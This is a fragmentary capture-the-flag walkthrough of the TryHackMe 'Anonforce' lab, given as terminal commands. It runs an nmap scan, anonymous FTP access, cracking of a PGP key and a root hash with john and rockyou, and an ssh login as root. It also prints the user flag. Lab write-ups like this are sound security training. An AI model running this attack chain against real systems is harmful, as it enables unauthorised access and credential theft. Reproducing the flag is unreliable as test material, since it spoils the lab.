...
```
bibo318@parrot:~/CTFs/tryhackme/Anonforce$ sudo nmap -A -sS -sC -sV -O 10.10.119.81
...
```
bibo318@parrot:~/CTFs/tryhackme/Anonforce$ ftp 10.10.119.81
...
bibo318@parrot:~/CTFs/tryhackme/Anonforce$ cat user.txt
606083fd33beb1284fc51f411a706af8
```

```
bibo318@parrot:~/CTFs/tryhackme/Anonforce$ gpg2john private.asc > pgp.hash
File private.asc

bibo318@parrot:~/CTFs/tryhackme/Anonforce$ john pgp.hash --wordlist=/usr/share/wordlists/rockyou.txt
...
```
bibo318@parrot:~/CTFs/tryhackme/Anonforce$ gpg --import private.asc
...
bibo318@parrot:~/CTFs/tryhackme/Anonforce$ gpg --decrypt backup.pgp
...
bibo318@parrot:~/CTFs/tryhackme/Anonforce$ john root.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
...
```
bibo318@parrot:~/CTFs/tryhackme/Anonforce$ ssh root@10.10.119.81
